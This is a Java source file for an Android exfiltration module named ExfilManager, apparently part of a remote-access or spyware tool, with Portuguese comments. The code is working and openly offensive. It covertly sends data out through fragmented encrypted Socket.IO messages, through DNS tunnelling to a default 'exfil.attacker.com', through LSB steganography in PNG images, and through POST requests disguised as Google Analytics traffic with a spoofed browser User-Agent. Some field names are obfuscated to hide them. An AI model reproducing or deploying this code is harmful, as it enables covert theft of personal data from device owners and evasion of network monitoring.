package com.etechd.l3mon.managers;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.net.InetAddress;
import java.net.URL;
import java.net.HttpURLConnection;
import java.util.ArrayList;
import java.util.List;

import com.etechd.l3mon.IOSocket;
import com.etechd.l3mon.StringCrypto;

/**
 * ExfilManager - Técnicas avançadas de exfiltração stealth
 * 
 * Métodos suportados:
 *  - Fragmentação + criptografia (básico)
 *  - DNS Tunneling
 *  - Esteganografia em imagem (LSB)
 *  - HTTP Mimic (disfarçado de requisição legítima)
 */
public class ExfilManager {

    private static final String TAG = "ExfilManager";
    private static final int CHUNK_SIZE = 400; // ~400 chars para ficar abaixo de limites DNS/HTTP

    public enum ExfilChannel {
        SOCKET_FRAGMENTED,
        DNS_TUNNEL,
        STEGANOGRAPHY_IMAGE,
        HTTP_MIMIC
    }

    // ==================== FRAGMENTAÇÃO ====================

    public static List<String> fragmentData(String data) {
        List<String> chunks = new ArrayList<>();
        int length = data.length();
        for (int i = 0; i < length; i += CHUNK_SIZE) {
            int end = Math.min(i + CHUNK_SIZE, length);
            chunks.add(data.substring(i, end));
        }
        return chunks;
    }

    /**
     * Envia dados fragmentados + criptografados via Socket.IO normal
     */
    public static void sendFragmented(String eventType, String plainData) {
        try {
            String encrypted = CryptoManager.encrypt(plainData);
            if (encrypted == null) {
                encrypted = plainData; // fallback
            }

            List<String> chunks = fragmentData(encrypted);
            for (int i = 0; i < chunks.size(); i++) {
                JSONObject fragment = new JSONObject();
                fragment.put(StringCrypto.d("EjzoMySf593GDkjPByro3A=="), i);           // chunk_index
                fragment.put(StringCrypto.d("4K3a5ngZ6qGBES9m9jtxeg=="), chunks.size()); // total_chunks
                fragment.put(StringCrypto.d("B9G6+3heWf715hd4xk743g=="), chunks.get(i)); // data
                fragment.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());

                if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
                    IOSocket.getInstance().getIoSocket().emit(eventType, fragment);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "sendFragmented error: " + e.getMessage());
        }
    }

    // ==================== DNS TUNNELING ====================

    /**
     * DNS Tunneling real (exfiltra dados via consultas DNS)
     * 
     * Uso: sendViaDNSTunnel("data.seudominio.com", "informacao_secreta");
     * 
     * Requer que você controle o DNS do domínio (ou use um domínio que loga queries).
     */
    public static void sendViaDNSTunnel(String baseDomain, String data) {
        try {
            String encoded = Base64.encodeToString(data.getBytes("UTF-8"), Base64.NO_WRAP);
            encoded = encoded.replace("+", "-").replace("/", "_").replace("=", "");

            // Divide em pedaços de até 60 chars (limite de label DNS)
            int maxLabel = 60;
            List<String> labels = new ArrayList<>();
            for (int i = 0; i < encoded.length(); i += maxLabel) {
                int end = Math.min(i + maxLabel, encoded.length());
                labels.add(encoded.substring(i, end));
            }

            for (int i = 0; i < labels.size(); i++) {
                String hostname = labels.get(i) + "." + (i + 1) + "." + labels.size() + "." + baseDomain;
                try {
                    // Dispara a consulta DNS (não precisa resolver, só o lookup)
                    InetAddress.getByName(hostname);
                    Log.d(TAG, "DNS exfil chunk " + (i + 1) + "/" + labels.size());
                    Thread.sleep(150); // pequeno delay para não floodar
                } catch (Exception ignored) {
                    // Mesmo se falhar a resolução, o query DNS já foi feito
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "DNS tunnel error: " + e.getMessage());
        }
    }

    /**
     * Versão simplificada: envia tudo em um único subdomínio (bom para dados pequenos)
     */
    public static void sendViaDNSTunnelSimple(String baseDomain, String data) {
        try {
            String encoded = Base64.encodeToString(data.getBytes("UTF-8"), Base64.NO_WRAP);
            encoded = encoded.replace("+", "-").replace("/", "_").replace("=", "");
            String hostname = encoded + ".ex." + baseDomain;

            InetAddress.getByName(hostname);
        } catch (Exception ignored) {}
    }

    // ==================== ESTEGANOGRAFIA EM IMAGEM ====================

    /**
     * Cria uma imagem PNG com dados escondidos usando LSB (Least Significant Bit)
     * 
     * @return byte[] do PNG com os dados ocultos
     */
    public static byte[] createSteganographicPNG(String secretData, int width, int height) {
        try {
            // Cria uma imagem "inofensiva" (pode ser uma imagem real depois)
            Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);

            // Preenche com padrão "inocente" (cinza claro)
            for (int y = 0; y < height; y++) {
                for (int x = 0; x < width; x++) {
                    int gray = 200 + (x + y) % 30;
                    int color = 0xFF000000 | (gray << 16) | (gray << 8) | gray;
                    bitmap.setPixel(x, y, color);
                }
            }

            // Converte dados para bits
            byte[] dataBytes = secretData.getBytes("UTF-8");
            StringBuilder bits = new StringBuilder();
            for (byte b : dataBytes) {
                bits.append(String.format("%8s", Integer.toBinaryString(b & 0xFF)).replace(' ', '0'));
            }

            // Esconde no canal azul (LSB)
            int bitIndex = 0;
            for (int y = 0; y < height && bitIndex < bits.length(); y++) {
                for (int x = 0; x < width && bitIndex < bits.length(); x++) {
                    int color = bitmap.getPixel(x, y);
                    int blue = color & 0xFF;

                    char bit = bits.charAt(bitIndex);
                    if (bit == '1') {
                        blue = blue | 0x01;   // seta LSB
                    } else {
                        blue = blue & 0xFE;   // limpa LSB
                    }

                    int newColor = (color & 0xFFFFFF00) | blue;
                    bitmap.setPixel(x, y, newColor);
                    bitIndex++;
                }
            }

            // Converte para PNG bytes
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
            return baos.toByteArray();

        } catch (Exception e) {
            Log.e(TAG, "Steganography error: " + e.getMessage());
            return null;
        }
    }

    /**
     * Extrai dados de uma imagem PNG esteganografada (para testes locais)
     */
    public static String extractFromSteganographicPNG(byte[] pngBytes) {
        try {
            Bitmap bitmap = BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.length);
            if (bitmap == null) return null;

            StringBuilder bits = new StringBuilder();

            for (int y = 0; y < bitmap.getHeight(); y++) {
                for (int x = 0; x < bitmap.getWidth(); x++) {
                    int color = bitmap.getPixel(x, y);
                    int blue = color & 0xFF;
                    bits.append((blue & 0x01) == 1 ? "1" : "0");
                }
            }

            // Converte bits de volta para string
            StringBuilder result = new StringBuilder();
            for (int i = 0; i + 8 <= bits.length(); i += 8) {
                String byteStr = bits.substring(i, i + 8);
                int val = Integer.parseInt(byteStr, 2);
                result.append((char) val);
            }
            return result.toString();

        } catch (Exception e) {
            return null;
        }
    }

    // ==================== HTTP MIMIC (disfarçado) ====================

    /**
     * Envia dados disfarçado de requisição de analytics/telemetria
     */
    public static void sendViaHttpMimic(String data, String targetUrl) {
        try {
            String encrypted = CryptoManager.encrypt(data);
            if (encrypted == null) encrypted = data;

            URL url = new URL(targetUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36");
            conn.setRequestProperty("Accept", "*/*");
            conn.setDoOutput(true);

            // Disfarça como parâmetro de analytics
            String payload = "v=1&tid=UA-XXXXXX-X&cid=" + System.currentTimeMillis() + "&t=event&ec=app&ea=update&el=" +
                    Base64.encodeToString(encrypted.getBytes("UTF-8"), Base64.NO_WRAP);

            conn.getOutputStream().write(payload.getBytes("UTF-8"));
            conn.getOutputStream().flush();
            conn.getOutputStream().close();

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "HTTP mimic response: " + responseCode);
            conn.disconnect();

        } catch (Exception e) {
            Log.e(TAG, "HTTP mimic error: " + e.getMessage());
        }
    }

    // ==================== MÉTODO UNIFICADO ====================

    /**
     * Exfiltra dados usando o canal escolhido
     */
    public static void exfiltrate(String data, ExfilChannel channel, String... params) {
        switch (channel) {
            case SOCKET_FRAGMENTED:
                String event = (params.length > 0) ? params[0] : "0xEX";
                sendFragmented(event, data);
                break;

            case DNS_TUNNEL:
                String domain = (params.length > 0) ? params[0] : "exfil.attacker.com";
                sendViaDNSTunnel(domain, data);
                break;

            case STEGANOGRAPHY_IMAGE:
                byte[] stegoPng = createSteganographicPNG(data, 64, 64);
                if (stegoPng != null) {
                    // Aqui você pode salvar a imagem ou enviá-la por outro canal
                    Log.d(TAG, "Imagem esteganografada gerada: " + stegoPng.length + " bytes");
                    // Exemplo: salvar em /sdcard/.cache/update.png
                }
                break;

            case HTTP_MIMIC:
                String url = (params.length > 0) ? params[0] : "https://www.google-analytics.com/collect";
                sendViaHttpMimic(data, url);
                break;
        }
    }

    // ==================== HELPER ====================

    public static String base64Encode(String input) {
        try {
            return Base64.encodeToString(input.getBytes("UTF-8"), Base64.NO_WRAP);
        } catch (Exception e) {
            return "";
        }
    }
}